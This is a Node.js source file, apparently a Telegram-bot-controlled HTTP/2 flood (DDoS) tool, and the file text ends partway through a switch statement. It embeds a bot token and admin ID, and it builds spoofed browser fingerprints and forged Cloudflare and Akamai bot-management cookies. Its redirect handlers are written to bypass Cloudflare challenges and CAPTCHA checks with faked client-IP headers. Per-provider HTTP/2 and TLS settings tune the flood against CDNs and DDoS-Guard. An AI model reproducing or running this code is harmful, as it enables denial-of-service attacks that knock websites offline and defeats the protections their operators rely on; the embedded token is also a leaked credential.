const crypto = require('crypto');
const tls = require('tls');
const net = require('net');
const http2 = require('http2');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');
const socks = require('socks').SocksClient;
const { URL } = require('url');
const gradient = require('gradient-string');
const axios = require('axios');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// ============ TELEGRAM BOT CONFIG ============
const TELEGRAM_TOKEN = '8689273557:AAFwVX9Snb5-bRRjuE01Jd9wnW1ThPbubvY
';
const ADMIN_ID = '7143607080';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

// ============ CẤU HÌNH CỐ ĐỊNH ============
const FIXED_THREADS = 3;
const FIXED_RATE = 100000000;

// ============ GLOBAL VARIABLES ============
let isAttacking = false;
let attackProcess = null;
let currentTarget = null;
let currentDuration = 0;
let startTime = null;
let totalRequests = 0;
let statusCounts = {};
let isBotRunning = true;
let lastUpdateId = 0;
let activeWorkers = [];

// ============ HPACK SIMULATOR ============
class AdvancedHPACKSimulator {
    constructor() {
        this.dynamicTable = [];
        this.maxTableSize = 4096;
        this.currentSize = 0;
        this.indexMap = new Map();
        this.staticTable = this.initStaticTable();
    }

    initStaticTable() {
        return new Map([
            [':authority', 1], [':method GET', 2], [':method POST', 3],
            [':path /', 4], [':scheme https', 7], ['accept', 19],
            ['accept-encoding', 16], ['accept-language', 17],
            ['cache-control', 24], ['cookie', 32], ['user-agent', 58]
        ]);
    }

    addToTable(name, value) {
        const entry = `${name}:${value}`;
        const entrySize = name.length + value.length + 32;
        while (this.currentSize + entrySize > this.maxTableSize && this.dynamicTable.length > 0) {
            const removed = this.dynamicTable.shift();
            this.currentSize -= (removed.name.length + removed.value.length + 32);
        }
        this.dynamicTable.push({ name, value, entry });
        this.indexMap.set(entry, this.dynamicTable.length + 61);
        this.currentSize += entrySize;
    }

    compressHeaders(headers) {
        const compressed = [];
        const headerOrder = [
            ':method', ':path', ':scheme', ':authority',
            'cache-control', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform',
            'upgrade-insecure-requests', 'user-agent', 'accept',
            'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest',
            'accept-encoding', 'accept-language', 'cookie', 'referer'
        ];
        const orderedHeaders = {};
        headerOrder.forEach(key => {
            if (headers[key]) orderedHeaders[key] = headers[key];
        });
        Object.keys(headers).forEach(key => {
            if (!orderedHeaders[key]) orderedHeaders[key] = headers[key];
        });
        for (const [name, value] of Object.entries(orderedHeaders)) {
            const entry = `${name}:${value}`;
            if (this.indexMap.has(entry)) {
                compressed.push(`INDEX:${this.indexMap.get(entry)}`);
            } else {
                compressed.push(`LITERAL:${name}:${value}`);
                this.addToTable(name, value);
            }
        }
        return compressed;
    }
}

// ============ FINGERPRINT GENERATOR ============
class BrowserFingerprintGenerator {
    constructor() {
        this.fingerprintCache = new Map();
        this.sessionData = new Map();
        this.initRealFingerprints();
    }

    initRealFingerprints() {
        this.realFingerprints = [
            {
                platform: 'Windows',
                browser: 'Chrome',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: '1920x1080',
                webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)',
                canvas: this.generateCanvasHash(),
                audio: this.generateAudioContext(),
                timezone: 'Asia/Ho_Chi_Minh'
            },
            {
                platform: 'macOS',
                browser: 'Chrome',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: '1440x900',
                webgl: 'WebKit WebGL',
                canvas: this.generateCanvasHash(),
                audio: this.generateAudioContext(),
                timezone: 'Asia/Bangkok'
            },
            {
                platform: 'Linux',
                browser: 'Firefox',
                version: '121.0',
                ua: 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
                viewport: '1366x768',
                webgl: 'Mesa DRI Intel(R)',
                canvas: this.generateCanvasHash(),
                audio: this.generateAudioContext(),
                timezone: 'Asia/Seoul'
            },
            {
                platform: 'Windows',
                browser: 'Edge',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                viewport: '1920x1080',
                webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)',
                canvas: this.generateCanvasHash(),
                audio: this.generateAudioContext(),
                timezone: 'Asia/Tokyo'
            },
            {
                platform: 'macOS',
                browser: 'Safari',
                version: '16.0',
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
                viewport: '1440x900',
                webgl: 'WebKit WebGL',
                canvas: this.generateCanvasHash(),
                audio: this.generateAudioContext(),
                timezone: 'Asia/Hong_Kong'
            }
        ];
    }

    generateCanvasHash() {
        return crypto.randomBytes(16).toString('hex');
    }

    generateAudioContext() {
        return (Math.random() * 124.04344968795776).toFixed(15);
    }

    getRandomFingerprint() {
        return this.realFingerprints[Math.floor(Math.random() * this.realFingerprints.length)];
    }

    generateAdvancedCookies(hostname, sessionId) {
        const timestamp = Date.now();
        const baseTime = timestamp - Math.floor(Math.random() * 2592000000);
        const cookies = {
            cf_clearance: this.generateCfClearance(hostname, sessionId),
            __cf_bm: this.generateCfBm(),
            _cfuvid: `${this.randomHex(32)}.${Math.floor(timestamp / 1000)}`,
            ak_bmsc: this.randomBase64(88),
            _abck: `${this.randomBase64(144)}~0~${this.randomBase64(64)}~0~-1`,
            bm_mi: this.generateBmMi(),
            bm_sv: this.generateBmSv(),
            _ga: `GA1.1.${this.generateGAClientId()}.${Math.floor(baseTime / 1000)}`,
            [`_ga_${this.randomString(10, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')}`]: `GS1.1.${timestamp}.1.1.${timestamp + Math.floor(Math.random() * 3600000)}.0`,
            _gid: `GA1.2.${this.generateGAClientId()}.${Math.floor(timestamp / 86400000)}`,
            sessionid: this.randomHex(32),
            csrftoken: this.randomBase64(64),
            _fbp: `fb.1.${timestamp}.${Math.floor(Math.random() * 2000000000)}`,
            _fbc: `fb.1.${timestamp}.${this.randomString(16)}`,
            gdpr_consent: `1~${this.generateConsentString()}`,
            euconsent: this.generateEuConsent(),
            __cf_bfm: this.randomBase64(64) + '.' + timestamp
        };
        return Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');
    }

    generateCfClearance(hostname, sessionId) {
        const timestamp = Math.floor(Date.now() / 1000);
        const challenge = this.randomBase64(43);
        const hmac = crypto.createHmac('sha256', `${hostname}:${sessionId}`)
            .update(`${challenge}:${timestamp}`)
            .digest('hex').slice(0, 8);
        return `${challenge}.${sessionId}-${timestamp}-${hmac}.bfm${Math.random().toString(36).slice(2, 8)}`;
    }

    generateCfBm() {
        return this.randomBase64(43) + '=';
    }

    generateBmMi() {
        return `${this.randomHex(32)}~${this.randomHex(16)}`;
    }

    generateBmSv() {
        return `${this.randomBase64(1000)}~${this.randomHex(8)}~${Date.now()}`;
    }

    generateGAClientId() {
        return `${Math.floor(Math.random() * 2000000000)}.${Math.floor(Math.random() * 2000000000)}`;
    }

    generateConsentString() {
        const purposes = Array(24).fill().map(() => Math.random() > 0.3 ? '1' : '0').join('');
        return Buffer.from(purposes).toString('base64').replace(/=/g, '');
    }

    generateEuConsent() {
        return `CP${this.randomString(20, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_')}.`;
    }

    randomString(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
        return Array.from(crypto.randomBytes(length))
            .map(b => chars[b % chars.length])
            .join('');
    }

    randomBase64(length) {
        return Buffer.from(crypto.randomBytes(Math.ceil(length * 3 / 4)))
            .toString('base64')
            .replace(/=/g, '')
            .slice(0, length);
    }

    randomHex(length) {
        return crypto.randomBytes(Math.ceil(length / 2))
            .toString('hex')
            .slice(0, length);
    }
}

// ============ REDIRECT HANDLER ============
class AdvancedRedirectHandler {
    constructor(options = {}) {
        this.maxRedirects = options.maxRedirects || 15;
        this.redirectHistory = [];
        this.redirectTimings = [];
        this.suspiciousPatterns = new Set();
    }

    async handleRedirect(response, currentUrl, options = {}) {
        const location = this.extractLocation(response);
        if (!location) return null;
        const redirectUrl = this.resolveRedirectUrl(location, currentUrl);
        const redirectType = this.analyzeRedirectType(response, redirectUrl, currentUrl);
        if (this.isProtectionRedirect(redirectType, redirectUrl)) {
            return this.handleProtectionRedirect(redirectUrl, currentUrl, options);
        }
        await this.calculateRedirectDelay(redirectType, currentUrl, redirectUrl);
        const redirectOptions = this.prepareRedirectOptions(options, currentUrl, redirectUrl, redirectType);
        return { redirectUrl, redirectOptions, redirectType };
    }

    extractLocation(response) {
        return response[':location'] ||
            response['location'] ||
            response['Location'] ||
            this.extractMetaRefresh(response.body) ||
            this.extractJSRedirect(response.body);
    }

    extractMetaRefresh(body) {
        if (!body) return null;
        const match = body.match(/<meta[^>]*http-equiv=["']refresh["'][^>]*content=["'][^"']*url=([^"'>\s]+)/i);
        return match ? match[1] : null;
    }

    extractJSRedirect(body) {
        if (!body) return null;
        const patterns = [
            /window\.location\.href\s*=\s*["']([^"']+)["']/i,
            /window\.location\s*=\s*["']([^"']+)["']/i,
            /location\.href\s*=\s*["']([^"']+)["']/i,
            /document\.location\s*=\s*["']([^"']+)["']/i,
            /window\.location\.replace\s*\(\s*["']([^"']+)["']\s*\)/i
        ];
        for (const pattern of patterns) {
            const match = body.match(pattern);
            if (match) return match[1];
        }
        return null;
    }

    resolveRedirectUrl(location, currentUrl) {
        try {
            return new URL(location, currentUrl).href;
        } catch {
            return location;
        }
    }

    analyzeRedirectType(response, redirectUrl, currentUrl) {
        const status = response[':status'];
        const currentDomain = new URL(currentUrl).hostname;
        const redirectDomain = new URL(redirectUrl).hostname;
        const type = {
            status,
            crossDomain: currentDomain !== redirectDomain,
            isProtection: this.detectProtectionRedirect(response, redirectUrl),
            isChallenge: this.detectChallengeRedirect(response, redirectUrl),
            isLoop: this.redirectHistory.includes(redirectUrl),
            timing: Date.now()
        };
        this.redirectHistory.push(redirectUrl);
        this.redirectTimings.push(type.timing);
        if (this.redirectHistory.length > this.maxRedirects) {
            this.redirectHistory.shift();
            this.redirectTimings.shift();
        }
        return type;
    }

    detectProtectionRedirect(response, redirectUrl) {
        const protectionSigns = [
            /cloudflare/i.test(redirectUrl),
            /cf-ray/i.test(JSON.stringify(response)),
            /cdn-cgi/i.test(redirectUrl),
            /__cf_bm/i.test(response.cookie || ''),
            /incapsula/i.test(redirectUrl),
            /imperva/i.test(redirectUrl),
            /distil/i.test(redirectUrl),
            /perimeterx/i.test(redirectUrl),
            /datadome/i.test(redirectUrl),
            /challenge/i.test(redirectUrl),
            /security/i.test(redirectUrl),
            /verify/i.test(redirectUrl),
            /captcha/i.test(redirectUrl),
            /bot.?check/i.test(redirectUrl)
        ];
        return protectionSigns.some(pattern =>
            typeof pattern === 'boolean' ? pattern : pattern.test(redirectUrl)
        );
    }

    detectChallengeRedirect(response, redirectUrl) {
        const challengePatterns = [
            /challenge.*platform/i,
            /security.*check/i,
            /browser.*check/i,
            /javascript.*challenge/i,
            /pow.*challenge/i,
            /ray.*id/i
        ];
        const body = response.body || '';
        const headers = JSON.stringify(response);
        return challengePatterns.some(pattern =>
            pattern.test(redirectUrl) || pattern.test(body) || pattern.test(headers)
        );
    }

    isProtectionRedirect(redirectType, redirectUrl) {
        return redirectType.isProtection ||
            redirectType.isChallenge ||
            this.suspiciousPatterns.has(new URL(redirectUrl).hostname);
    }

    async handleProtectionRedirect(redirectUrl, currentUrl, options) {
        const bypassStrategy = this.selectBypassStrategy(redirectUrl);
        switch (bypassStrategy) {
            case 'cloudflare':
                return this.bypassCloudflare(redirectUrl, currentUrl, options);
            case 'challenge':
                return this.bypassChallenge(redirectUrl, currentUrl, options);
            case 'aggressive':
                return this.bypassAggressive(redirectUrl, currentUrl, options);
            default:
                return this.bypassGeneric(redirectUrl, currentUrl, options);
        }
    }

    selectBypassStrategy(redirectUrl) {
        if (/cloudflare|cdn-cgi|cf-ray/i.test(redirectUrl)) return 'cloudflare';
        if (/challenge|verify|captcha/i.test(redirectUrl)) return 'challenge';
        if (this.redirectHistory.length > 5) return 'aggressive';
        return 'generic';
    }

    async bypassCloudflare(redirectUrl, currentUrl, options) {
        const cfDelay = this.calculateCFDelay();
        await this.sleep(cfDelay);
        const cfOptions = {
            ...options,
            customHeaders: {
                ...options.customHeaders,
                'cf-connecting-ip': this.generateRandomIP(),
                'cf-ipcountry': this.getRandomCountryCode(),
                'cf-ray': this.generateCFRay(),
                'cf-visitor': '{"scheme":"https"}',
                'x-forwarded-for': this.generateRandomIP(),
                'x-real-ip': this.generateRandomIP()
            },
            fetchSite: 'same-origin',
            fetchMode: 'navigate',
            fetchDest: 'document'
        };
        return { redirectUrl, redirectOptions: cfOptions, bypassType: 'cloudflare' };
    }

    async bypassChallenge(redirectUrl, currentUrl, options) {
        const challengeDelay = Math.floor(Math.random() * 3000) + 2000;
        await this.sleep(challengeDelay);
        const challengeOptions = {
            ...options,
            customHeaders: {
                ...options.customHeaders,
                'upgrade-insecure-requests': '1',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'x-requested-with': null
            }
        };
        return { redirectUrl, redirectOptions: challengeOptions, bypassType: 'challenge' };
    }

    async bypassAggressive(redirectUrl, currentUrl, options) {
        const aggressiveDelay = Math.floor(Math.random() * 1000) + 500;
        await this.sleep(aggressiveDelay);
        const aggressiveOptions = {
            ...options,
            rotateHeaders: true,
            customHeaders: {
                ...options.customHeaders,
                'cache-control': 'no-cache, no-store, must-revalidate',
                'pragma': 'no-cache',
                'expires': '0',
                'x-forwarded-proto': 'https',
                'x-scheme': 'https'
            }
        };
        return { redirectUrl, redirectOptions: aggressiveOptions, bypassType: 'aggressive' };
    }

    async bypassGeneric(redirectUrl, currentUrl, options) {
        const genericDelay = this.calculateHumanDelay();
        await this.sleep(genericDelay);
        return {
            redirectUrl,
            redirectOptions: options,
            bypassType: 'generic'
        };
    }

    async calculateRedirectDelay(redirectType, currentUrl, redirectUrl) {
        let delay = 0;
        if (redirectType.crossDomain) {
            delay += Math.floor(Math.random() * 500) + 200;
        } else {
            delay += Math.floor(Math.random() * 200) + 100;
        }
        if (redirectType.isProtection) {
            delay += Math.floor(Math.random() * 2000) + 1000;
        }
        if (redirectType.isChallenge) {
            delay += Math.floor(Math.random() * 3000) + 2000;
        }
        const recentRedirects = this.redirectTimings.filter(t =>
            Date.now() - t < 10000
        ).length;
        if (recentRedirects > 3) {
            delay += recentRedirects * 500;
        }
        delay += this.calculateHumanDelay();
        return Math.min(delay, 10000);
    }

    calculateHumanDelay() {
        const baseDelay = Math.floor(Math.random() * 1000) + 500;
        const variation = Math.floor(Math.random() * 500) - 250;
        return Math.max(baseDelay + variation, 100);
    }

    calculateCFDelay() {
        return Math.floor(Math.random() * 2000) + 3000;
    }

    prepareRedirectOptions(options, currentUrl, redirectUrl, redirectType) {
        const redirectOptions = { ...options };
        redirectOptions.referer = currentUrl;
        const currentHost = new URL(currentUrl).hostname;
        const redirectHost = new URL(redirectUrl).hostname;
        if (currentHost === redirectHost) {
            redirectOptions.fetchSite = 'same-origin';
        } else if (this.isSameSite(currentHost, redirectHost)) {
            redirectOptions.fetchSite = 'same-site';
        } else {
            redirectOptions.fetchSite = 'cross-site';
        }
        if (redirectType.isProtection || redirectType.isChallenge) {
            redirectOptions.fetchMode = 'navigate';
            redirectOptions.fetchDest = 'document';
            redirectOptions.fetchUser = '?1';
        }
        return redirectOptions;
    }

    isSameSite(host1, host2) {
        try {
            const domain1 = host1.split('.').slice(-2).join('.');
            const domain2 = host2.split('.').slice(-2).join('.');
            return domain1 === domain2;
        } catch {
            return false;
        }
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    generateCFRay() {
        const chars = '0123456789abcdef';
        let ray = '';
        for (let i = 0; i < 16; i++) {
            ray += chars[Math.floor(Math.random() * chars.length)];
        }
        return ray + '-' + this.getRandomCountryCode();
    }

    getRandomCountryCode() {
        const countryCodes = ['US', 'VN', 'JP', 'DE', 'FR', 'GB', 'CN', 'IN', 'BR', 'AU', 'CA', 'RU', 'KR', 'SG'];
        return countryCodes[Math.floor(Math.random() * countryCodes.length)];
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    reset() {
        this.redirectHistory = [];
        this.redirectTimings = [];
    }
}

// ============ HEADER POOLS ============
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/pdf;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xhtml+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-apple-plist+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/svg+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-www-form-urlencoded;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/javascript;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ecmascript;q=0.9"
];

const cache_header = [
    'max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0, private',
    'no-cache, no-store, must-revalidate, max-age=0, private, s-maxage=0',
    'no-cache, no-store, pre-check=0, post-check=0, must-revalidate, proxy-revalidate, s-maxage=0',
    'no-cache, no-store, private, max-age=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0',
    'no-cache, no-store, private, s-maxage=0, max-age=0, must-revalidate, stale-if-error=0',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0, stale-if-error=0',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, pre-check=0, post-check=0',
    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, proxy-revalidate',
    'private, no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0, immutable',
    'no-cache, no-store, must-revalidate, max-age=0, private, proxy-revalidate, must-understand',
    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, pre-check=0, post-check=0'
];

const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8'
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];

const encoding_header = [
    'gzip, deflate, br',
    'deflate, gzip',
    'gzip, identity',
    'gzip, compress, br',
    'identity, gzip, deflate',
    'gzip, deflate, zstd',
    'br, zstd, gzip',
    'gzip, deflate, br, lzma',
    'deflate, br, zstd, xpress',
    'gzip, deflate, xz',
    'gzip, zstd, snappy',
    'identity, *;q=0',
    'gzip, identity',
    'deflate, gzip',
    'compress, gzip',
    '*'
];

// ============ TLS CONFIG ============
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
    'TLS_RSA_WITH_AES_128_GCM_SHA256'
];

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':');

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

// ============ HTTP/2 SETTINGS BY ISP (FIXED) ============
function getOptimizedHttp2SettingsByISP(isp, opts = {}) {
    const defaultSettings = {
        headerTableSize: 65536,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
        maxFrameSize: 40000,
        enableConnectProtocol: false,
        bfmBypass: opts.highbypass || false
    };
    const settings = { ...defaultSettings };
    switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 1000 : 10000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = Math.random() > 0.25 ? 40000 : 131072;
            settings.maxHeaderListSize = Math.random() > 0.5 ? 262144 : 524288;
            settings.enablePush = false;
            settings.bfmBypass = true;
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            settings.bfmBypass = opts.highbypass || false;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            settings.bfmBypass = opts.highbypass || false;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            settings.bfmBypass = opts.highbypass || false;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = Math.random() > 0.7 ? 1 : 10;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            settings.bfmBypass = true;
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? 100 : 200;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            settings.bfmBypass = opts.highbypass || false;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
